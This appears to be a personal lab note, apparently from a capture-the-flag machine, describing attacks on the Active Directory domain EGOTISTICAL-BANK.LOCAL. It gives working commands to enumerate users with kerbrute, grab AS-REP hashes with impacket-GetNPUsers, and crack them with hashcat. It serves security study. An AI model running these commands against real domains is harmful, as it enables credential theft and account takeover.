# Finding users without Kerberos preauthentication
---
- Have a l**ist of `users.txt`** containing list of potential users.
- Kerbrute:
	- `kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 users.txt`
		- `userenum`: Enumerate Users
		- `-d`: Domain name
		- `--dc`: Domain controller IP
		- `users.txt`: file containing list of possible users
	- ==Note:- If you get `DOMAIN_NAME: Name or service not known`, add IP and domain in `/etc/hosts`file==

	![[Pasted image 20250424134552.png]]

# ASREP-Roasting
---
- We can no**w grab the user's hash:**
	- `impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith -no-pass -format john`
		- `-no-pass`: Don't ask for password (as we know this user does not have kerberos preauthentication)
		- `-format`: JohnTheRipper crackable format
	- ![[Pasted image 20250424135213.png]]
- **Another option** ==`GetNPUsers`== if we just want to **brute the `users`file:**
	- `impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile osint_output/usernames.txt  -no-pass -format john`
		- Instead of one user, it will try all the users in the give file/
	- ![[Pasted image 20250424135227.png]]


# Crack the hash using `hashcat`:
---
- `hashcat fsmith_hash.txt /usr/share/wordlists/rockyou.txt`
- ![[Pasted image 20250424135328.png]]